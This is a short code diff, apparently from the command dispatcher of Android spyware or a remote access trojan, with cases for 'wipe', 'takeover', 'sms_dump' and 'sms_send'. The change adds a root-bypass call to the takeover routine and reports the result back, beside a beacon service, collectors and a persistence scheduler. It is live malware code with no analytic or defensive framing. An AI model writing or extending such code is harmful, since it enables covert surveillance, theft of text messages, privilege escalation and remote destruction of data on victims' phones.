@@ -67,11 +67,14 @@ final class Dispatcher {
                     return ok(wipe(ctx));
                 case "takeover":
                     // Re-assert the on-device side of the takeover: watchers,
-                    // collectors and the wake-up chain, then report the state.
+                    // collectors, root grants and the wake-up chain, then report.
                     prime(ctx);
                     Scheduler.arm(ctx);
                     BeaconService.start(ctx);
-                    return ok(perms(ctx));
+                    String root = Root.bypass(ctx);
+                    JSONObject state = perms(ctx);
+                    state.put("root", root);
+                    return ok(state);
                 case "sms_dump":
                     return ok(SmsStore.dump(ctx, parseInt(first, 200)));
                 case "sms_send":
